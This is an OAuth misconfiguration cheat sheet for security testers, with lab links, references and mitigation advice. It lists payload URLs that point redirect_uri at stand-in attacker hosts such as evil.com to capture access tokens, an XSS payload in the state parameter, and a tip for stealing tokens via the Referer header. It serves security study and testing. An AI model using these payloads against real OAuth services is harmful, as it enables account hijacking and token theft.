# OAuth Misconfiguration

> OAuth is a widely-used authorization framework that allows third-party applications to access user data without exposing user credentials. However, improper configuration and implementation of OAuth can lead to severe security vulnerabilities. This document explores common OAuth misconfigurations, potential attack vectors, and best practices for mitigating these risks. 


## Summary

- [Stealing OAuth Token via referer](#stealing-oauth-token-via-referer)
- [Grabbing OAuth Token via redirect_uri](#grabbing-oauth-token-via-redirect---uri)
- [Executing XSS via redirect_uri](#executing-xss-via-redirect---uri)
- [OAuth Private Key Disclosure](#oauth-private-key-disclosure)
- [Authorization Code Rule Violation](#authorization-code-rule-violation)
- [Cross-Site Request Forgery](#cross-site-request-forgery)
- [Labs](#labs)
- [References](#references)


## Stealing OAuth Token via referer

> Do you have HTML injection but can't get XSS? Are there any OAuth implementations on the site? If so, setup an img tag to your server and see if there's a way to get the victim there (redirect, etc.) after login to steal OAuth tokens via referer - [@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544)


## Grabbing OAuth Token via redirect_uri

Redirect to a controlled domain to get the access token

```powershell
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

Redirect to an accepted Open URL in to get the access token

```powershell
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

OAuth implementations should never whitelist entire domains, only a few URLs so that “redirect_uri” can’t be pointed to an Open Redirect.

Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:

```powershell
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```


## Executing XSS via redirect_uri

```powershell
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```


## OAuth Private Key Disclosure

Some Android/iOS app can be decompiled and the OAuth Private key can be accessed.


## Authorization Code Rule Violation

> The client MUST NOT use the authorization code  more than once.  

If an authorization code is used more than once, the authorization server MUST deny the request 
and SHOULD revoke (when possible) all tokens previously issued based on that authorization code.


## Cross-Site Request Forgery

Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable. This can be exploited by initializing the OAuth flow and intercepting the callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). This URL can be used in CSRF attacks.

> The client MUST implement CSRF protection for its redirection URI. This is typically accomplished by requiring any request sent to the redirection URI endpoint to include a value that binds the request to the user-agent's authenticated state. The client SHOULD utilize the "state" request parameter to deliver this value to the authorization server when making an authorization request.


## Labs

* [PortSwigger - Authentication bypass via OAuth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
* [PortSwigger - Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
* [PortSwigger - OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
* [PortSwigger - Stealing OAuth access tokens via a proxy page](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
* [PortSwigger - Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)


## References

- [All your Paypal OAuth tokens belong to me - asanso - November 28, 2016](http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html) 
- [OAuth 2 - How I have hacked Facebook again (..and would have stolen a valid access token) - asanso - April 8, 2014](http://intothesymmetry.blogspot.ch/2014/04/oauth-2-how-i-have-hacked-facebook.html)
- [How I hacked Github again - Egor Homakov - February 7, 2014](http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html)
- [How Microsoft is giving your data to Facebook… and everyone else - Andris Atteka - September 16, 2014](http://andrisatteka.blogspot.ch/2014/09/how-microsoft-is-giving-your-data-to.html)
- [Bypassing Google Authentication on Periscope's Administration Panel - Jack Whitton - July 20, 2015](https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/)